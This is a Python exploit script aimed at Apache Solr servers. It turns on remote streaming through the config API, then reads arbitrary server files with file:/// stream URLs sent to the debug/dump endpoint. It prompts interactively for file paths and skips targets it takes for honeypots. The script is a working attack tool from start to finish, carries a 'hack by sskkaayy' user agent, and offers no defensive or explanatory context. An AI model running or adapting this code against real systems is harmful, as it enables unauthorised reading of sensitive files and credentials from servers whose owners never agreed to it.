import requests
import sys,re,json
import threadpool
#from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings()


def exp(url):

    try:
        dbName = getDb(url)
        
        if dbName:

            session = requests.Session()
            rawBody = "{  \"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
            headers = {"User-Agent":"hack by sskkaayy","Connection":"close","Content-type":"application/json","Accept":"*/*"}
            response = session.post("{}/solr/{}/config".format(url,dbName), data=rawBody, headers=headers)
            
            print(">Core: {}".format(dbName))

            while True:
                linux = File(url,dbName)
                try:
                    print('>result:\n')

                    if 'Permission' in str(linux):
                        print('Permission denied\n')
                        continue
                    if 'No such file or directory' in str(linux):
                        print('No such file or directory\n')
                        continue
                    linux = json.loads(linux)
                    if linux['streams']:
                        print(linux['streams'][0]['stream'])
                except:
                    r = re.compile('''<str name="stream">(.*?)</str>''')
                    Str = re.findall(r,str(linux))
                    res = Str[0].replace('\\n','\n')
                    print(res + '\n')


    except Exception as e:
        print(e)
        # print("Not vul")

def File(url,dbName):

    session = requests.Session()
    paramsGet = {"param":"ContentStreams"}
    path = input(">Path: ")
    paramsPost = {"stream.url":"file:///{}".format(path)}
    headers = {"User-Agent":"hack by sskkaayy","Connection":"close","Accept":"*/*"}
    response = session.post("{}/solr/{}/debug/dump".format(url,dbName), data=paramsPost, params=paramsGet, headers=headers)

    return response.content

def getDb(url):

    try:
        target = url + '/solr/admin/cores?action=STATUS'
        response = requests.get(target,verify=False,timeout=20)
        data = response.text
        if '关于全网部署360私有云的通知' in data:
            print('[- 蜜罐烦死啦!')
            return False

        try:
            r = re.compile('''"status":{
    "(.*?)":{''')
            Str = re.findall(r,str(data))
            dbName = Str[0]
        except:
            r = re.compile('''<str name="name">(.*?)</str>''')
            Str = re.findall(r,str(data))
            dbName = Str[0]

    except Exception as e:
        return False
    return dbName

if __name__ == "__main__":
    exp(sys.argv[1])
